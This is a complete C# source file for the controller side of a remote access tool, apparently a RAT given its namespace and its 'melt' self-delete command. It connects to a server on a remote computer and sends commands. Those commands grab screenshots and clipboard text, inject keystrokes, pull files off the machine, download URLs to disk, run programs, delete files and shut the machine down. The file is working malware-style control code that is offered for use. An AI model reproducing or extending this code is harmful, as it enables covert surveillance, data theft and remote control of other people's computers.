using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using System.Xml.Serialization;

namespace RATClient
{
    public class Program
    {
        #region "Declarations"
        static TcpClient sock = new TcpClient();
        static string serverID;       
        #endregion
        #region "Main"
        static void Main(string[] args)
        {
            string CMD;
            StartInfo();
            Console.WriteLine("");
            while (true)
            {
                Console.Write(serverID + ">");
                CMD = Console.ReadLine();
                if (ValidCommand(CMD))
                {
                    string[] CMDS = CMD.Split(' ');
                    switch (CMDS[0].ToLower())
                    {
                        case "connect":
                            Connect(CMDS[1]);
                            break;
                        case "disconnect":
                            EndConnection();
                            Console.WriteLine("Client: Not Connected");
                            break;
                        case "message":
                        case "run":
                        case "info":
                        case "processes":
                        case "delete":
                        case "download":
                        case "shutdown":
                        case "clipboard":
                        case "sendkeys":
                        case "services":
                        case "retrieve":
                        case "search":
                        case "software":
                        case "screenshot":
                        case "restart":
                        case "logoff":
                        case "taskkill":
                        case "ipconfig":
                        case "tree":
                        case "netstat":
                        case "ping":
                        case "talk":
                            if (!ConnectCheck()) break;
                            SendCommand(CMDS);
                            break;
                        case "clear":
                            Console.Clear();
                            StartInfo();
                            break;
                        case "help":
                            Help();
                            break;
                        case "exit":
                            EndConnection();
                            Environment.Exit(0);
                            break;
                        case "melt":
                            if (!ConnectCheck()) break;
                            Console.WriteLine("Are You Sure You Want Delete The Server? This Can Not Be Undone. Type \"Y\" To Confirm. Type \"N\" To Cancel.");
                            string confirm = Console.ReadLine();
                            if (confirm.ToLower() != "y") break;
                            SendCommand(CMDS);
                            break;
                    }
                } else Console.WriteLine("Invalid Command.");
                Console.WriteLine("");
            }
        }
        #endregion       
        #region "Connection Methods"
        static void EndConnection()
        {
            if (sock.Connected) { sock.Close(); serverID = string.Empty; }
        }
        static void Connect(string Dest)
        {
            if (!sock.Connected) {
                string[] IPInfo = Dest.Split(':');
                IPAddress ip = IPAddress.Parse(IPInfo[0]);
                int.TryParse(IPInfo[1], out int port);
                try
                {
                    sock = new TcpClient();
                    sock.Connect(ip, port);
                    serverID = ip.ToString() + ":" + port.ToString();
                    Console.WriteLine("Client: Connected To: " + serverID + ".");
                }
                catch { Console.WriteLine("Error: The Server Is Unreachable."); }
            } else Console.WriteLine("Already Connected - Disconnect First.");
        }
        static void SendCommand(string[] CMDS)
        {
            try
            {
                Command c = new Command { CMD = CMDS[0] };
                int argcount = CMDS.Length - 1;
                if (argcount != 0)
                {
                    string[] args = new string[argcount];
                    for (int i = 0; i < argcount; i++) args[i] = CMDS[i + 1];
                    c.Args = args;
                }
                NetworkStream nstream = sock.GetStream();
                byte[] sendBytes = Encoding.Unicode.GetBytes(SerializeToXml(c));
                nstream.Write(sendBytes, 0, sendBytes.Length);
                nstream.Flush();
                byte[] message = new byte[sock.ReceiveBufferSize + 1];
                StringBuilder sb = new StringBuilder();
                int bytesRead = 0;
                do
                {
                    bytesRead = nstream.Read(message, 0, sock.ReceiveBufferSize);
                    sb.Append(Encoding.Unicode.GetString(message, 0, bytesRead));
                } while (bytesRead == sock.ReceiveBufferSize);
                if (sb.ToString() == string.Empty) return;
                Response r = DeserializeFromXml<Response>(sb.ToString());
                if (r.Type == "Message") { Console.WriteLine(r.Msg); }
                else if (r.Type == "Data")
                {
                    try
                    {
                        using (var w = new BinaryWriter(File.OpenWrite(r.Msg))) w.Write(r.Data);
                        Console.WriteLine(r.Msg + " Received.");
                    }
                    catch (Exception e) { Console.WriteLine(e.Message); }   
                }
            } catch (Exception e) { Console.WriteLine(e.Message); }
        }
        #endregion
        #region "Helper Methods"
        static bool ValidCommand(string CMD)
        {
            Match m = Regex.Match(CMD, "^disconnect$|^info$|^processes$|^netstat$|^melt$|^ipconfig$|^screenshot$|^logoff$|^shutdown$|^restart$|^clipboard$|^services$|^software$|^clear$|^help$|^exit$|^connect (?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$|^message .+$|^run .+$|^taskkill .+$|^talk .+$|^ping .+$|^delete (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^sendkeys .+$|^retrieve (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^search (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^download (https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|www\\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\\.[^\\s]{2,}|https?:\\/\\/(?:www\\.|(?!www))[a-zA-Z0-9]+\\.[^\\s]{2,}|www\\.[a-zA-Z0-9]+\\.[^\\s]{2,}) (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$|^tree (?<ParentPath>(?:[a-zA-Z]\\:|\\\\\\\\[\\w\\s\\.]+\\\\[\\w\\s\\.$]+)\\\\(?:[\\w\\s\\.]+\\\\)*)(?<BaseName>[\\w\\s\\.]*?)$", RegexOptions.IgnoreCase);
            return m.Success;
        }
        static void StartInfo()
        {
            Console.WriteLine("Remote Administration Tool");
            Console.WriteLine("Type HELP For A List Of Commands");
        }
        static bool ConnectCheck()
        {
            if (!sock.Connected) Console.WriteLine("Need To Be Connected To Use This Command.");
            return sock.Connected;
        }
        static void Help()
        {            
            Console.WriteLine("CLEAR                    Clear The Screen");
            Console.WriteLine("CONNECT [ip:port]        Start A Connection");
            Console.WriteLine("DISCONNECT               End A Connection");
            Console.WriteLine("EXIT                     Quit The Program");
            Console.WriteLine("HELP                     List Commands");
            Console.WriteLine("");
            Console.WriteLine("CLIPBOARD                Return ClipBoard Text If Present");          
            Console.WriteLine("DELETE [path]            Delete A File On The Computer");          
            Console.WriteLine("DOWNLOAD [url] [path]    Download A File To The Computer");           
            Console.WriteLine("INFO                     List Computer Information");
            Console.WriteLine("IPCONFIG                 List Computer Network Information");
            Console.WriteLine("LOGOFF                   Log Off The Computer");
            Console.WriteLine("MELT                     Delete The Server");
            Console.WriteLine("MESSAGE [message]        Send A Message To The Computer");
            Console.WriteLine("NETSTAT                  List Active Computer Connections");
            Console.WriteLine("PING [target]            Ping Another Computer");
            Console.WriteLine("PROCESSES                List Running Processes");
            Console.WriteLine("RESTART                  Restart The Computer");
            Console.WriteLine("RETRIEVE [path]          Download A File From The Computer");
            Console.WriteLine("RUN [path]               Run A Program");
            Console.WriteLine("SCREENSHOT               Return A Screenshot From The Computer");
            Console.WriteLine("SEARCH [path]            List The Contents Of A Directory");
            Console.WriteLine("SENDKEYS [keys]          Send Key Presses To The Computer");
            Console.WriteLine("SERVICES                 List Running Services");
            Console.WriteLine("SHUTDOWN                 Shutdown The Computer");
            Console.WriteLine("SOFTWARE                 List Installed Software");
            Console.WriteLine("TALK [phrase]            Say A Phrase With Text To Speech");
            Console.WriteLine("TASKKILL [path]          Kill A Running Process");
            Console.WriteLine("TREE [path]              Return A Folder Structure");
        }
        static T DeserializeFromXml<T>(string xml)
        {
            T z;
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (TextReader y = new StringReader(xml))
            {
                z = (T)x.Deserialize(y);
            }
            return z;
        }
        static string SerializeToXml<T>(T obj)
        {
            XmlSerializer x = new XmlSerializer(typeof(T));
            using (var z = new StringWriter())
            {
                using (XmlTextWriter w = new XmlTextWriter(z) { Formatting = Formatting.None })
                {
                    x.Serialize(w, obj);
                    return z.ToString();
                }
            }
        }
        #endregion
    }
    #region "Objects
    [Serializable]
    public class Command
    {
        public string CMD { get; set; }
        public string[] Args { get; set; }
    }
    [Serializable]
    public class Response
    {
        public string Type { get; set; }
        public string Msg { get; set; }
        public byte[] Data { get; set; }
    }
    #endregion
}